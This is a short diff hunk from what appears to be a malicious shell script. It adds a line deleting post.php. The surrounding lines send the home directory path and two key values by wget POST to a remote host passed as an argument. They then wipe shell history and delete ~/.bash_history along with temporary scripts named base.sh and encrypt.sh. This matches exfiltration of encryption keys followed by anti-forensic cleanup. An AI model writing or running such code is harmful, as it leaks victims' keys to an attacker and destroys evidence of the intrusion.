@@ -10,6 +10,7 @@ hd=`echo ~/`
 wget --post-data "dir=$hd&Key1=$l&key2=$m" $1 > /dev/null 2>&1
 history -c > /dev/null 2>&1
 history -w > /dev/null 2>&1
+rm post.php
 rm ~/.bash_history > /dev/null 2>&1
 rm /tmp/base.sh > /dev/null 2>&1
 rm /tmp/encrypt.sh > /dev/null 2>&1
